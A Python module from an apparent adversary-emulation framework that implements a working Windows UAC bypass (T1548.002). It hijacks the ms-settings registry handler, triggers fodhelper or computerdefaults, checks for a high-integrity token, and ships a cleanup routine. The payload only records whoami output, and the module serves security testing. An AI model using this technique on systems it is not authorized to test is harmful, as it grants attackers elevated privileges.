from __future__ import annotations

import logging
from typing import Any

from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
from purplestrike.techniques.connection import TargetConnection, command_error, get_connection

logger = logging.getLogger(__name__)
_created_targets: set[str] = set()


async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
    """Bypass UAC via fodhelper registry key manipulation."""
    conn: TargetConnection | None = None
    try:
        method = parameters.get("method", "fodhelper")
        conn = await get_connection(target)
        if method == "fodhelper":
            setup = await conn.run_ps(
                "$ErrorActionPreference = 'Stop'; "
                "$root = 'HKCU:\\Software\\Classes\\ms-settings'; "
                "$key = Join-Path $root 'shell\\open\\command'; "
                "if (Test-Path -LiteralPath $root) { "
                "throw 'Existing ms-settings registration will not be overwritten' }; "
                "$handler = Join-Path $env:TEMP 'purplestrike_uac_handler.vbs'; "
                "$marker = Join-Path $env:TEMP 'purplestrike_uac_integrity.txt'; "
                "[IO.File]::Delete($marker); "
                "$vbs = @("
                "'Set shell = CreateObject(\"WScript.Shell\")',"
                "'Set proc = shell.Exec(\"cmd.exe /d /c whoami /groups\")',"
                "'content = proc.StdOut.ReadAll() & proc.StdErr.ReadAll()',"
                "'marker = shell.ExpandEnvironmentStrings("
                "\"%TEMP%\\purplestrike_uac_integrity.txt\")',"
                "'Set stream = CreateObject(\"Scripting.FileSystemObject\").CreateTextFile("
                "marker, True)',"
                "'stream.Write content',"
                "'stream.Close'); "
                "Set-Content -LiteralPath $handler -Encoding ASCII -Value $vbs; "
                "New-Item -Path $key -Force | Out-Null; "
                "New-ItemProperty -Path $key -Name 'DelegateExecute' -Value '' "
                "-PropertyType String -Force | Out-Null; "
                "$wscript = Join-Path $env:SystemRoot 'System32\\wscript.exe'; "
                "$payload = '\"' + $wscript + '\" //B //NoLogo \"' + $handler + '\"'; "
                "(Get-Item -LiteralPath $key).SetValue('', $payload, "
                "[Microsoft.Win32.RegistryValueKind]::String); "
                "$actual = (Get-Item -LiteralPath $key).GetValue(''); "
                "if ($actual -ne $payload) { throw 'Default command verification failed' }; "
                "Write-Output ('default-command=' + $actual)"
            )
            if not setup.success:
                return TechniqueResult(
                    technique_id="T1548.002",
                    success=False,
                    output=setup.stdout[:4096],
                    error=command_error(setup)[:1024],
                    execution_status=ExecutionStatus.FAILURE,
                )
            _created_targets.add(target)
            trigger = await conn.run_ps(
                "$ErrorActionPreference = 'Stop'; "
                "$marker = Join-Path $env:TEMP 'purplestrike_uac_integrity.txt'; "
                "[IO.File]::Delete($marker); "
                "$usedLauncher = $null; "
                "$launchers = @("
                "(Join-Path $env:SystemRoot 'System32\\fodhelper.exe'), "
                "(Join-Path $env:SystemRoot 'System32\\computerdefaults.exe')); "
                "foreach ($launcher in $launchers) { "
                "if (!(Test-Path -LiteralPath $launcher)) { continue }; "
                "Start-Process -FilePath $launcher -WindowStyle Hidden; "
                "for ($i=0; $i -lt 30 -and !(Test-Path -LiteralPath $marker); $i++) "
                "{ Start-Sleep -Milliseconds 250 }; "
                "if (Test-Path -LiteralPath $marker) { "
                "$usedLauncher = Split-Path -Leaf $launcher; break } }; "
                "if (!(Test-Path -LiteralPath $marker)) { "
                "throw 'Neither auto-elevated launcher executed the registered command' }; "
                "$content = Get-Content -LiteralPath $marker -Raw; "
                "if ($content -notmatch 'S-1-16-12288|High Mandatory Level') { "
                "throw 'Child process did not report a high-integrity token' }; "
                "Write-Output ('launcher=' + $usedLauncher); "
                "Write-Output 'High-integrity child token verified'"
            )
            return TechniqueResult(
                technique_id="T1548.002",
                success=trigger.success,
                output=setup.stdout[:2048] + "\n" + trigger.stdout[:2048],
                error=trigger.stderr[:1024] if not trigger.success else None,
                execution_status=ExecutionStatus.SUCCESS
                if trigger.success
                else ExecutionStatus.FAILURE,
                artifacts=[
                    "%TEMP%\\purplestrike_uac_integrity.txt",
                    "%TEMP%\\purplestrike_uac_handler.vbs",
                ],
                evidence=["The fodhelper child reported a high-integrity token."],
            )
        return TechniqueResult(
            technique_id="T1548.002",
            success=False,
            error=f"Unknown method: {method}",
            execution_status=ExecutionStatus.FAILURE,
        )
    except Exception as e:
        logger.error(f"T1548.002 execution failed: {e}")
        return TechniqueResult(
            technique_id="T1548.002",
            success=False,
            error=str(e),
            execution_status=ExecutionStatus.FAILURE,
        )
    finally:
        if conn:
            await conn.disconnect()


async def cleanup(target: str) -> None:
    """Reverse any changes made during execution."""
    conn: TargetConnection | None = None
    try:
        if target not in _created_targets:
            return
        conn = await get_connection(target)
        result = await conn.run_ps(
            "Remove-Item -Path 'HKCU:\\Software\\Classes\\ms-settings' "
            "-Recurse -Force -ErrorAction SilentlyContinue; "
            "Remove-Item -LiteralPath (Join-Path $env:TEMP "
            "'purplestrike_uac_integrity.txt'), (Join-Path $env:TEMP "
            "'purplestrike_uac_handler.vbs') -Force -ErrorAction SilentlyContinue"
        )
        if not result.success:
            raise RuntimeError(command_error(result))
        _created_targets.discard(target)
    except Exception as e:
        logger.warning(f"T1548.002 cleanup failed: {e}")
    finally:
        if conn:
            await conn.disconnect()
